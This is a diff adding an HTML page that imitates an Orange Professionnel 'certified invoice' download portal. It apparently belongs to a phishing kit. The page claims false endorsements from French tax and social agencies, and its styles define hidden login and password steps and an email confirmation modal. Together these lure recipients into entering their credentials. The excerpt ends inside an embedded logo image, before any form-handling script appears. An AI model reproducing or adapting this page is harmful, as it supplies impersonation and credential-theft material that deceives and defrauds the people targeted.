@@ -1,0 +1,1018 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Orange Pro | Documents Certifiés</title>
+    <style>
+        :root {
+            --orange: #FF7900;
+            --orange-dark: #E56D00;
+            --orange-light: #FFE9D9;
+            --red: #E53935;
+            --white: #FFFFFF;
+            --gray-light: #F8F8F8;
+            --gray-dark: #333333;
+            --green: #4CAF50;
+            --blue: #2196F3;
+        }
+        
+        body {
+            font-family: 'Segoe UI', 'Roboto', system-ui, -apple-system, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: var(--gray-light);
+            color: var(--gray-dark);
+            line-height: 1.6;
+        }
+        
+        .secure-container {
+            max-width: 680px;
+            margin: 40px auto;
+            background: var(--white);
+            border-radius: 16px;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+            border: 1px solid rgba(0,0,0,0.05);
+            transition: all 0.4s ease;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, var(--orange), var(--orange-dark));
+            color: var(--white);
+            padding: 30px;
+            text-align: center;
+            position: relative;
+            border-bottom: 4px solid rgba(255,255,255,0.2);
+        }
+        
+        .header h1 {
+            margin: 0;
+            font-weight: 700;
+            font-size: 2rem;
+            letter-spacing: -0.5px;
+        }
+        
+        .content {
+            padding: 35px;
+        }
+        
+        .document-title {
+            color: var(--orange);
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin: 0 0 10px 0;
+            position: relative;
+            display: inline-block;
+        }
+        
+        .document-title::after {
+            content: "";
+            position: absolute;
+            bottom: -8px;
+            left: 0;
+            width: 50px;
+            height: 3px;
+            background: var(--orange);
+            border-radius: 3px;
+        }
+        
+        .document-description {
+            color: #555;
+            font-size: 1.05rem;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        
+        /* Section Certifications PRO */
+        .certifications-section {
+            background: var(--white);
+            border-radius: 12px;
+            padding: 25px;
+            margin: 30px 0;
+            border: 1px solid rgba(0,0,0,0.05);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.03);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .certifications-section::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+            background: linear-gradient(to bottom, var(--orange), var(--green));
+        }
+        
+        .certification-badge {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: var(--orange-light);
+            color: var(--orange);
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .certification-badge svg {
+            width: 14px;
+            height: 14px;
+            fill: var(--orange);
+        }
+        
+        .certification-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .certification-card {
+            background: var(--gray-light);
+            border-radius: 10px;
+            padding: 18px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(0,0,0,0.05);
+        }
+        
+        .certification-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+        }
+        
+        .certification-icon {
+            width: 40px;
+            height: 40px;
+            background: var(--white);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.05);
+        }
+        
+        .certification-icon svg {
+            width: 22px;
+            height: 22px;
+        }
+        
+        .certification-text {
+            flex: 1;
+        }
+        
+        .certification-name {
+            font-weight: 600;
+            font-size: 0.95rem;
+            margin-bottom: 3px;
+        }
+        
+        .certification-desc {
+            font-size: 0.8rem;
+            color: #666;
+            line-height: 1.4;
+        }
+        
+        /* Directive Européenne */
+        .directive-notice {
+            background: rgba(33, 150, 243, 0.08);
+            border-left: 4px solid var(--blue);
+            padding: 15px;
+            border-radius: 0 8px 8px 0;
+            margin-top: 25px;
+            display: flex;
+            gap: 12px;
+        }
+        
+        .directive-icon {
+            color: var(--blue);
+            flex-shrink: 0;
+        }
+        
+        .directive-text {
+            font-size: 0.85rem;
+            color: #444;
+        }
+        
+        .directive-text strong {
+            color: var(--blue);
+            font-weight: 600;
+        }
+        
+        /* Bouton Premium */
+        .pdf-access-btn {
+            background: linear-gradient(135deg, var(--orange), var(--orange-dark));
+            color: white;
+            border: none;
+            padding: 18px 25px;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 30px;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 25px rgba(255, 121, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+        
+        .pdf-access-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 30px rgba(255, 121, 0, 0.4);
+        }
+        
+        .pdf-access-btn:active {
+            transform: translateY(1px);
+        }
+        
+        .pdf-icon-btn {
+            width: 26px;
+            height: 26px;
+            background: white;
+            border-radius: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .pdf-icon-btn svg {
+            width: 18px;
+            height: 18px;
+            fill: var(--orange);
+        }
+        
+        .security-badge {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 0.85rem;
+            color: #666;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .security-badge svg {
+            fill: var(--green);
+            width: 16px;
+            height: 16px;
+        }
+        
+        /* Logos partenaires */
+        .partners-section {
+            margin: 30px 0;
+            padding: 20px 0;
+            border-top: 1px dashed #ddd;
+            border-bottom: 1px dashed #ddd;
+        }
+        
+        .partners-title {
+            text-align: center;
+            color: #666;
+            font-size: 0.9rem;
+            margin-bottom: 15px;
+            font-weight: 500;
+        }
+        
+        .partners-grid {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            flex-wrap: wrap;
+        }
+        
+        .partner-logo {
+            width: 120px;
+            height: 80px;
+            background-color: #f5f5f5;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+        }
+        
+        .partner-logo:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+        }
+        
+        .partner-logo img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+
+        /* Page de connexion (cachée par défaut) */
+        .login-container {
+            display: none;
+            max-width: 500px;
+            margin: 40px auto;
+            background: var(--white);
+            border-radius: 16px;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+            border: 1px solid rgba(0,0,0,0.05);
+            animation: fadeIn 0.4s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .login-header {
+            background: linear-gradient(135deg, var(--orange), var(--orange-dark));
+            color: var(--white);
+            padding: 25px;
+            text-align: center;
+            position: relative;
+        }
+
+        .login-header h2 {
+            margin: 0;
+            font-weight: 600;
+            font-size: 1.5rem;
+        }
+
+        .login-content {
+            padding: 30px;
+        }
+
+        .login-form .form-group {
+            margin-bottom: 20px;
+        }
+
+        .login-form label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #444;
+            font-size: 0.95rem;
+        }
+
+        .login-form input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            box-sizing: border-box;
+        }
+
+        .login-form input:focus {
+            border-color: var(--orange);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(255, 121, 0, 0.2);
+        }
+
+        .login-btn {
+            background: linear-gradient(135deg, var(--orange), var(--orange-dark));
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+            transition: all 0.3s ease;
+        }
+
+        .login-btn:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
+        }
+
+        .forgot-password {
+            text-align: right;
+            margin-top: 5px;
+        }
+
+        .forgot-password a {
+            color: var(--orange);
+            text-decoration: none;
+            font-size: 0.85rem;
+            transition: all 0.2s ease;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        /* Page de mot de passe (cachée initialement) */
+        .password-container {
+            display: none;
+            max-width: 500px;
+            margin: 40px auto;
+            background: var(--white);
+            border-radius: 16px;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+            border: 1px solid rgba(0,0,0,0.05);
+            animation: fadeIn 0.4s ease-out;
+        }
+
+        .password-header {
+            background: linear-gradient(135deg, var(--orange), var(--orange-dark));
+            color: var(--white);
+            padding: 25px;
+            text-align: center;
+            position: relative;
+        }
+
+        .password-header h2 {
+            margin: 0;
+            font-weight: 600;
+            font-size: 1.5rem;
+        }
+
+        .password-content {
+            padding: 30px;
+        }
+
+        .password-form .form-group {
+            margin-bottom: 20px;
+        }
+
+        .password-form label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #444;
+            font-size: 0.95rem;
+        }
+
+        .password-form input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            box-sizing: border-box;
+        }
+
+        .password-form input:focus {
+            border-color: var(--orange);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(255, 121, 0, 0.2);
+        }
+
+        .password-btn {
+            background: linear-gradient(135deg, var(--orange), var(--orange-dark));
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+            transition: all 0.3s ease;
+        }
+
+        .password-btn:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
+        }
+
+        /* Modal de confirmation */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .modal-container {
+            background: white;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 450px;
+            overflow: hidden;
+            box-shadow: 0 15px 30px rgba(0,0,0,0.15);
+            transform: translateY(0);
+            transition: all 0.3s ease;
+        }
+
+        .modal-header {
+            padding: 20px;
+            background: var(--gray-light);
+            border-bottom: 1px solid #eee;
+            text-align: center;
+            position: relative;
+        }
+
+        .modal-header h3 {
+            margin: 0;
+            color: var(--gray-dark);
+            font-size: 1.3rem;
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: #999;
+        }
+
+        .modal-body {
+            padding: 25px;
+            text-align: center;
+        }
+
+        .modal-body p {
+            margin-bottom: 25px;
+            color: #555;
+            line-height: 1.5;
+        }
+
+        .modal-email {
+            font-weight: 600;
+            color: var(--orange);
+            word-break: break-all;
+        }
+
+        .modal-actions {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+        }
+
+        .modal-btn {
+            padding: 12px 25px;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            border: none;
+        }
+
+        .modal-btn-primary {
+            background: var(--orange);
+            color: white;
+        }
+
+        .modal-btn-secondary {
+            background: none;
+            color: var(--orange);
+            border: 1px solid var(--orange);
+        }
+
+        .modal-btn:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
+        }
+
+        /* Notification flash */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: var(--green);
+            color: white;
+            padding: 15px 25px;
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            z-index: 1100;
+            transform: translateX(200%);
+            transition: all 0.3s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+        }
+
+        .notification.show {
+            transform: translateX(0);
+        }
+
+        .notification svg {
+            fill: white;
+            width: 20px;
+            height: 20px;
+        }
+
+        .notification-error {
+            background: var(--red);
+        }
+
+        /* Animation de chargement */
+        .loader {
+            display: none;
+            width: 50px;
+            height: 50px;
+            margin: 20px auto;
+            border: 5px solid var(--orange-light);
+            border-radius: 50%;
+            border-top-color: var(--orange);
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- Étape 1 : Page principale -->
+    <div class="secure-container" id="mainContainer">
+        <div class="step active" id="step1">
+            <div class="header">
+                <h1>Orange Professionnel</h1>
+            </div>
+            <div class="content">
+                <h2 class="document-title">Devis-Facture</h2>
+                <p class="document-description">
+                    Votre document officiel certifié est disponible au format PDF sécurisé. 
+                    Ce document a valeur légale et est conforme aux dernières réglementations.
+                </p>
+                
+                <!-- Section Certifications Premium -->
+                <div class="certifications-section">
+                    <div class="certification-badge">
+                        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+                        CERTIFIÉ
+                    </div>
+                    
+                    <h3 style="margin-top:0;color:#444;font-weight:600;">Certifications Officielles</h3>
+                    <p style="color:#666;margin-bottom:0;font-size:0.95rem;">
+                        Ce document bénéficie des certifications et validations suivantes :
+                    </p>
+                    
+                    <div class="certification-grid">
+                        <div class="certification-card">
+                            <div class="certification-icon" style="background:#F5F9FF;">
+                                <svg viewBox="0 0 24 24" fill="#1A73E8"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V5h14v14z"/><path d="M8.5 15H10v-5H7v1.5h1.5zM13.25 12.75L16.25 15H18l-2.25-3L18 9h-1.75l-3 3.75zM12 10.5H13V15h-1.5v-4.5z"/></svg>
+                            </div>
+                            <div class="certification-text">
+                                <div class="certification-name">DGFiP</div>
+                                <div class="certification-desc">Direction Générale des Finances Publiques</div>
+                            </div>
+                        </div>
+                        
+                        <div class="certification-card">
+                            <div class="certification-icon" style="background:#F0F7FF;">
+                                <svg viewBox="0 0 24 24" fill="#0B5FFF"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+                            </div>
+                            <div class="certification-text">
+                                <div class="certification-name">Chorus Pro</div>
+                                <div class="certification-desc">Plateforme de facturation publique</div>
+                            </div>
+                        </div>
+                        
+                        <div class="certification-card">
+                            <div class="certification-icon" style="background:#F5FFF0;">
+                                <svg viewBox="0 0 24 24" fill="#4CAF50"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+                            </div>
+                            <div class="certification-text">
+                                <div class="certification-name">URSSAF</div>
+                                <div class="certification-desc">Certification sociale validée</div>
+                            </div>
+                        </div>
+                        
+                        <div class="certification-card">
+                            <div class="certification-icon" style="background:#FFF8F0;">
+                                <svg viewBox="0 0 24 24" fill="#FF7900"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11V11.99z"/></svg>
+                            </div>
+                            <div class="certification-text">
+                                <div class="certification-name">DGAR</div>
+                                <div class="certification-desc">Direction Générale de l'Aménagement</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="directive-notice">
+                        <div class="directive-icon">
+                            <svg viewBox="0 0 24 24" width="24" height="24" fill="#2196F3"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+                        </div>
+                        <div class="directive-text">
+                            Conforme à la <strong>directive européenne 2020/284</strong> sur la facturation électronique et les exigences de reporting.
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Section Logos Partenaires -->
+                <div class="partners-section">
+                    <div class="partners-title">Partenaires officiels</div>
+                    <div class="partners-grid">
+                        <div class="partner-logo">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logo_FranceConnect_en_Octobre_2022.svg/1200px-Logo_FranceConnect_en_Octobre_2022.svg.png" alt="FranceConnect">
+                        </div>
+                        <div class="partner-logo">
+                            <img src="data:image/png;base64,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" alt="INPI">
+                        </div>
+                        <div class="partner-logo">
+                            <img src="data:image/png;base64,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